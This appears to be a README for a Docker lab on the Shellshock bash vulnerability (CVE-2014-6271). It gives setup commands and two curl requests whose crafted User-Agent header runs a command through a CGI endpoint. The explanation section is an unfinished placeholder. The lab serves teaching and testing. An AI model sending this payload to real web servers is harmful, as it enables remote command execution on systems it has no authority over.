# TITLE OF VULN
## Subtitle / what it does
Shellshock (CVE-2014-6271) is a vulnerability in bash shell and allows code execution when declaring new environment variable.
CGI extensions utilize bash and are available remotely on web server.
As CGIs create environment variables from user-supplied data, malicious HTTP header might cause code execution.

### Clear any existing containers
```
docker kill $(docker ps -q)
```

### Run in docker:
```
cd 2-shellshock
docker-compose build
docker-compose up -d
```

### Safe endpoint:
```
curl -H "User-Agent: () { foo; }; echo; /usr/bin/id" http://[Your IP]:8080/safe.cgi
```

### Vulnerable endpoint:
```
curl -H "User-Agent: () { foo; }; echo; /usr/bin/id" http://[Your IP]:8080/victim.cgi
```


### Explanation
This happens costam

### References and recommended reading
https://en.wikipedia.org/wiki/Common_Gateway_Interface
https://en.wikipedia.org/wiki/Shellshock_(software_bug)
https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf

### Credits:
https://github.com/vulhub/vulhub/tree/4d17ab2d4df39eefad5c498c5aa60b036a05494d/bash/shellshock
